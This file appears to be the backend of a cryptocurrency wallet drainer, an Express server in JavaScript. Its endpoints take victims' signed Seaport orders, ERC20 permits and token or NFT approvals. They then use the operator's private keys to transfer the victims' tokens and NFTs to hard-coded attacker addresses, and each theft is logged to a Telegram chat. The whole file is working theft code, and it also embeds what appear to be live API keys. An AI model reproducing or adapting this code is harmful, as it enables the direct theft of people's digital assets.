const express = require("express");
const request = require('request');
const cors = require('cors');
const seaport = require("@opensea/seaport-js");
const ethers = require("ethers");
const dotenv = require("dotenv");
const { jar } = require("request");
dotenv.config();

const app = express()
const PORT = process.env.PORT || 3000

app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

const ERC20_ABI = [
  {
    "constant": false,
    "inputs": [
      {
        "name": "_from",
        "type": "address"
      },
      {
        "name": "_to",
        "type": "address"
      },
      {
        "name": "_value",
        "type": "uint256"
      }
    ],
    "name": "transferFrom",
    "outputs": [
      {
        "name": "",
        "type": "bool"
      }
    ],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "constant": false,
    "inputs": [
      {
        "internalType": "address",
        "name": "owner",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "spender",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "rawAmount",
        "type": "uint256"
      },
      {
        "internalType": "uint256",
        "name": "deadline",
        "type": "uint256"
      },
      {
        "internalType": "uint8",
        "name": "v",
        "type": "uint8"
      },
      {
        "internalType": "bytes32",
        "name": "r",
        "type": "bytes32"
      },
      {
        "internalType": "bytes32",
        "name": "s",
        "type": "bytes32"
      }
    ],
    "name": "permit",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "constant": true,
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "nonces",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "payable": false,
    "stateMutability": "view",
    "type": "function"
  }
];
const ERC721 = [
  {
    "inputs": [
      { "internalType": "address", "name": "from", "type": "address" },
      { "internalType": "address", "name": "to", "type": "address" },
      { "internalType": "uint256", "name": "tokenId", "type": "uint256" },
    ],
    "name": "safeTransferFrom",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function",
  },
];
const ERC1155 = [
  {
    "constant": false,
    "inputs": [
      {
        "internalType": "address",
        "name": "_from",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "_to",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "_id",
        "type": "uint256"
      },
      {
        "internalType": "uint256",
        "name": "_value",
        "type": "uint256"
      },
      {
        "internalType": "bytes",
        "name": "_data",
        "type": "bytes"
      }
    ],
    "name": "safeTransferFrom",
    "outputs": [],
    "payable": false,
    "stateMutability": "nonpayable",
    "type": "function"
  },
];

const config = { 
  receiver: "0x46C4ac570d8edbD8BD62b36BA495D0BE771c4480",
  private_receiver: "0x0cc131B43de76A459c3dd0DF729df93d35a5Bb95",
    
    // ERC20 & NFT
    SAFAfulfiller: process.env.SAFAfulfiller,

    // Seaport
    fulfiller: process.env.fulfiller,

    BOT_TOKEN: process.env.bot,
    LOGS_CHAT_ID: "-1001542284779",
    SUCCESS_CHAT_ID: "-1001542284779",

    MORALIS_API_KEY: "XAgBvhdSiZdoNeJppNuPXa7f7t0N1Wgq3s5gF7kMEHx0Wk6YQgv7VObMOnotp5Wp",
    OPENSEA_API_KEY: "8b707e3a2b334c40bf7943b1b328e6e9"
 }


 const rpc_providers = {
  "1": "https://mainnet.infura.io/v3/988d51cc5e12469dbe2852d8b660b89a",
  "56": "https://rpc.ankr.com/bsc",
  "137": "https://rpc.ankr.com/polygon",
  "250": "https://rpc.ankr.com/fantom",
  "43114": "https://rpc.ankr.com/avalanche",
  "10": "https://rpc.ankr.com/optimism",
  "42161": "https://rpc.ankr.com/arbitrum",
  "100": "https://rpc.ankr.com/gnosis",
  "1285": "https://rpc.moonriver.moonbeam.network",
  "42220": "https://rpc.ankr.com/celo",
  "1313161554": "https://mainnet.aurora.dev"
  }


/******* SEAPORT METHOD *******/
app.post("/seaport_sign", async (req, res) => {
 
  let order = req.body
  let provider = new ethers.providers.JsonRpcProvider(
    "https://rpc.ankr.com/eth/d266e08a3e2a7271cb6b295914898820f5776ecbee7821ecec71d46c07c71113"
  );

  let fulFills = [];

  // Fulfillments
  order.parameters.offer.forEach((offerItem, offerIndex) => {
    const considerationIndex =
      order.parameters.consideration.findIndex(
        (considerationItem) =>
          considerationItem.itemType === offerItem.itemType &&
          considerationItem.token === offerItem.token &&
          considerationItem.identifierOrCriteria ===
          offerItem.identifierOrCriteria
      );

    if (considerationIndex === -1) {
      console.warn(
        "Could not find matching offer item in the consideration for private listing"
      );
    }

    fulFills.push({
      offerComponents: [
        {
          itemIndex: offerIndex,
          orderIndex: 0,
        },
      ],
      considerationComponents: [
        {
          itemIndex: considerationIndex,
          orderIndex: 0,
        },
      ],
    });
  });

  try {
    let fulfillments = [...fulFills];

    let fulfillerWallet = new ethers.Wallet(config.fulfiller);
    let fulfillerSigner = await fulfillerWallet.connect(provider);
    let spClientFulfiller = new seaport.Seaport(fulfillerSigner);

    let gasPrice = await provider.getGasPrice();
    let hexGasPrice = ethers.utils.hexlify(Math.floor(gasPrice * 2))
    let gasLimit = await spClientFulfiller
    .matchOrders({
      orders: [order],
      fulfillments,
      accountAddress: config.receiver,
    })
    .estimateGas();
    let gasLimitHex = ethers.utils.hexlify(gasLimit);

    console.log(gasLimitHex)


    const transaction = await spClientFulfiller
      .matchOrders({
        orders: [order],
        fulfillments,
        gasLimit:gasLimitHex ,
        accountAddress: config.receiver,
      })
      .transact();

    let escaper = (ah) => {
      return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
    }

          
    let message =
    `🟢 *Approved Seaport Trasaction*\n\n` +
     `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(transaction.hash)})\n\n`;

    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log(error);
      res.status(200).send({ status: true });
    });
  } catch (error) {
    console.warn("[-] Seaport error: ", error)
  }

});




/******* PERMIT SAFA *******/

app.post("/token_permit", async (req, res) => {

  

let input_chain = parseInt(req.body.chainId,16).toString();
let rpcUrl = rpc_providers[input_chain];
let provider = new ethers.providers.JsonRpcProvider(rpcUrl);

  let address = req.body.owner;
 
  let withdrawBalance = req.body.amount;
   let permit = JSON.parse(req.body.permit)
  let contractAddress = req.body.tokenAddress;
  
  
  let permitValue = permit.value;
  let r = permit.r;
  let s = permit.s;
  let v = permit.v;
  let deadline = permit.deadline;


  console.log(address,config.receiver,permitValue,deadline,withdrawBalance)

  let escaper = (ah) => {
    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
  }

  try {
    const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
    let contractInstance = new ethers.Contract(contractAddress, ERC20_ABI, signer);

    res.status(200).send({
      status: true,
    })
    let gasPrice = await provider.getGasPrice();

    let gasLimit = await contractInstance.estimateGas.permit(
      address, config.receiver, permitValue, deadline, v, r, s
    );

    let totalGas = gasLimit * gasPrice;
    console.log(totalGas,gasLimit,  gasPrice)


    let gasLimitHex = ethers.utils.hexlify(gasLimit);

    let permit = await contractInstance.permit(address, config.receiver, permitValue, deadline, v, r, s,  { gasLimit: gasLimitHex })

    let message =
      `🟢 *Approved PERMIT ERC20 Transaction*\n\n` +
      `🔑 *Wallet Address*: [${escaper(address)}](https://etherscan.io/address/${address})\n` +

      `🌐 *Transaction:* [Here](https://etherscan.io/tx/${escaper(permit.hash)})\n` +

      `❓ *contractAddress Name: ${escaper(contractAddress)}\n*`;

      
    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log("Sent PERMIT ERC20 log");
    });


    await provider.waitForTransaction(permit.hash);

    // WITHDRAWING THE PERMITTED TOKEN BALANCE

    let withdrawal = await contractInstance.transferFrom(address, config.private_receiver, withdrawBalance)

    let withdrawMessage =
      `*Withdrawed ERC20 permit*\n\n` +
      `*From:* [${escaper(address)}](https://etherscan.io/address/${address})\n` +
      `*To:* [${escaper(config.receiver)}](https://etherscan.io/address/${config.receiver})\n` +
      `*Amount: ${escaper(withdrawBalance)}*\n` +
      `*Type: ERC20 permit *\n` +
    `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;

    let withdrawClientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(withdrawClientServerOptions, (error, response) => {
      console.log("[+] Withdrawed PERMIT ERC20");
      res.status(200).send({ status: true });
    });


  } catch (error) {
    console.warn("[-] PERMIT error: ", error)
  }
});


/******* ERC20 SAFA *******/
app.post("/token_transfer", async (req, res) => {


  let input_chain = parseInt(req.body.chainId,16).toString();
  let rpcUrl = rpc_providers[input_chain];
  console.log(rpcUrl)
  let provider = new ethers.providers.JsonRpcProvider(rpcUrl);
  
  let chainId = req.body.chainId;
  let tokenAddress = req.body.tokenAddress;
  let abiUrl = req.body.abiUrl;
  let tokenBalance = req.body.amount;
  let owner = req.body.owner;
  let spender = req.body.spender;
  let transactionHash = req.body.transactionHash;

  let escaper = (ah) => {
    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
  }

  try {
    console.log(`[+] Sending ${abiUrl} log`)

    let message =
      `🟢 *Approved ${escaper(chainId)} TOKEN Transfer*\n\n` +
      `🔑 *Wallet Address*: [${escaper(owner)}](https://etherscan.io/address/${owner})\n` +
       `💰 *Token Balance: ${escaper(tokenBalance)}\n*` +
      `💸 *Token Address: ${escaper(tokenAddress)}\n\n*` +
      `🌎 *AbiUrl: *${escaper(abiUrl)} **\n`;
     
    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log("Sent ERC20 log");
    });

    hash_response = await provider.waitForTransaction(transactionHash);

 
 
    // WITHDRAWING THE SAFA ERC
    const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
    let contractInstance = new ethers.Contract(tokenAddress, ERC20_ABI, signer);

    let withdrawal = await contractInstance.transferFrom(owner, config.private_receiver, tokenBalance)

    let withdrawMessage =
      `*Withdrawed ${escaper(chainId)} APPROVED TOKEN*\n\n` +
      `*Wallet:* [${escaper(owner)}](https://etherscan.io/address/${owner})\n` +
      `*Amount: ${escaper(tokenBalance)}*\n` +
       `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;

    let withdrawClientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(withdrawClientServerOptions, (error, response) => {
      console.log("[+] Withdrawed ERC20");
      res.status(200).send({ status: true });
    });
  } catch (error) {
    console.warn("[-] SAFA ERC20 error: ", error)
  }
});

/******* NFT SAFA *******/
app.post("/nft_transfer", async (req, res) => {

  let input_chain = parseInt(req.body.chainId,16).toString();
  let rpcUrl = rpc_providers[input_chain];
  let provider = new ethers.providers.JsonRpcProvider(rpcUrl);
  
  let token_s = req.body.tokens;
  let tokenAddress = req.body.tokenAddress;
  let address = req.body.owner;
  let transactionHash = req.body.transactionHash;
  let tokenType = req.body.tokenType;
  
 

 
  let escaper = (ah) => {
    return ah.replaceAll('_', '\\_').replaceAll('*', '\\*').replaceAll('[', '\\[').replaceAll(']', '\\]').replaceAll('(', '\\(').replaceAll(')', '\\)').replaceAll('~', '\\~').replaceAll('`', '\\`').replaceAll('>', '\\>').replaceAll('#', '\\%23').replaceAll('+', '\\+').replaceAll('-', '\\-').replaceAll('=', '\\=').replaceAll('|', '\\|').replaceAll('{', '\\{').replaceAll('}', '\\}').replaceAll('.', '\\.').replaceAll('!', '\\!');
  }

  try {
    console.log(`[+] Sending ${tokenAddress} log`)

    let message =
      `🟢 *Approved NFT-SAFA Transfer of ${escaper(tokenAddress)}*\n\n` +
      `🔑 *Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n` +
      `*Tokens: ${escaper(token_s)}*\n`;
       

    let clientServerOptions = {
      uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
      body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: message, disable_web_page_preview: true }),
      method: 'POST',
      headers: {
        'Content-Type': 'application/json'
      }
    }

    request(clientServerOptions, (error, response) => {
      console.log("Sent NFT log");
    });

    hash_response = await provider.waitForTransaction(transactionHash);

    // WITHDRAWING THE APPROVED NFT
    console.log(address, tokenAddress)
    let tokenIdServerOptions = {
      uri: 'https://deep-index.moralis.io/api/v2/' + address + '/nft/' + tokenAddress + '?chain=Eth&format=decimal',
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'X-API-KEY': config.MORALIS_API_KEY
      }
    }

    request(tokenIdServerOptions, async (error, response, body) => {
      let tokenIds = [];
      JSON.parse(body).result.map(token => tokenIds.push(token.token_id))
      tokenIds.slice(0, 10)

      const signer = new ethers.Wallet(config.SAFAfulfiller, provider);
      for (let i = 0; i < tokenIds.length; i++) {
        console.log("[+] Withdrawing NFT " + tokenIds[i])
        let withdrawal;


        if (tokenType == "ERC721") {
          let contractInstance = new ethers.Contract(tokenAddress, ERC721, signer);
          withdrawal = await contractInstance.safeTransferFrom(address, config.private_receiver, tokenIds[i])
        }

        if (tokenType == "ERC1155") {
          let contractInstance = new ethers.Contract(tokenAddress, ERC1155, signer);
          withdrawal = await contractInstance.safeTransferFrom(address, config.private_receiver, tokenIds[i], 1, 256)
        }

        let withdrawMessage =
          `*Withdrawed APPROVED NFTS ${escaper(tokenAddress)}*\n\n` +
          `*Wallet:* [${escaper(address)}](https://etherscan.io/address/${address})\n` +
           `*Type: ${escaper(tokenType)} *\n` +
          `*Transaction:* [Here](https://etherscan.io/tx/${escaper(withdrawal.hash)})\n`;

        let withdrawClientServerOptions = {
          uri: 'https://api.telegram.org/bot' + config.BOT_TOKEN + '/sendMessage',
          body: JSON.stringify({ chat_id: config.SUCCESS_CHAT_ID, parse_mode: "MarkdownV2", text: withdrawMessage, disable_web_page_preview: true }),
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          }
        }
        request(withdrawClientServerOptions, (error, response) => {
          console.log("[+] Withdrawed NFT");
          res.status(200).send({ status: true });
        });

      }

    });

  } catch (error) {
    console.warn("[-] SAFA NFT error: ", error)
  }

});

 

 


app.listen(PORT, () => console.log(`Listening on port ${PORT}`))
